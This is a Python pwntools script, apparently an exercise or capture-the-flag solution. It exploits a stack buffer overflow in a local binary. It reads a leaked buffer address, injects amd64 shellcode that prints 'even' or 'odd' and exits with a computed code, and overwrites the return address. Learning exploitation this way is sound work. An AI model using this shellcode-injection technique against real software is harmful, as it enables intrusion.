#!/usr/bin/env python3
from pwn import *
import re

# Setup
context.log_level = 'error'
context.arch = 'amd64'

# Run process
io = process("./main.elf")

# Read from output
bufferAdr = int(io.recvline().decode('ascii').split(' ')[2].strip(), 16)
bufferAdr = p64(bufferAdr)
randomNum = io.recvline()
randomNum = int(io.recvline())
xorVal = randomNum ^ 166

# Do the printy thingy
codeInjection = ""
if xorVal % 2 == 0:
    codeInjection = asm('mov rax, 0x101010101010101')
    codeInjection += asm('push rax')
    codeInjection += asm('mov rax, 0x101010101010101 ^ 0xa6e657665')
    codeInjection += asm('xor [rsp], rax')
    codeInjection += asm('push 5')
else:
    codeInjection = asm('push 0x1010101 ^ 0xa64646f')
    codeInjection += asm('xor dword ptr [rsp], 0x1010101')
    codeInjection += asm('push 4')
codeInjection += asm('pop rdx')
codeInjection += asm('push SYS_write')
codeInjection += asm('pop rax')
codeInjection += asm('push (1)')
codeInjection += asm('pop rdi')
codeInjection += asm('mov rsi, rsp')
codeInjection += asm('syscall')

# Do the exity thingy
codeInjection += asm('push SYS_exit')
codeInjection += asm('pop rax')
codeInjection += asm('mov edi, ' + str(xorVal))
codeInjection += asm('syscall')

# Injection code
payload = codeInjection + b'a' * (120 - len(codeInjection)) + bufferAdr

# Send input
io.sendline(payload)

# Print output
try:
    r = io.recvuntil(b'ye!\nodd').decode('ascii')
    flag_regex = re.compile('\nodd')
    print(flag_regex.findall(r)[0].strip())
except:
    try:
        r = io.recvuntil(b'ye!\neven').decode('ascii')
        flag_regex = re.compile('\neven')
        print(flag_regex.findall(r)[0].strip())
    except:
        print(io.recvall().decode('ascii'))
print('exit code: ' + str(io.poll(True)))
